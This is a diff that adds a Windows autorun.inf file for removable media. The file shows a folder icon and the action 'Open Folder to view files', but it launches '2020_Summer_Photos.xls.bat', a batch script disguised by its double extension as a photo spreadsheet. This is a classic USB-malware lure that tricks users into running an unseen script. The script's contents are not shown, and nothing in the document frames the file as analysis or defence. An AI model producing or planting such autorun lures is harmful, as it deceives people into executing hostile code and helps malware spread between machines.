@@ -1,0 +1,4 @@
+[autorun]
+Action=Open Folder to view files
+Icon=%systemroot%\system32\shell32.dll,4
+OPEN=2020_Summer_Photos.xls.bat
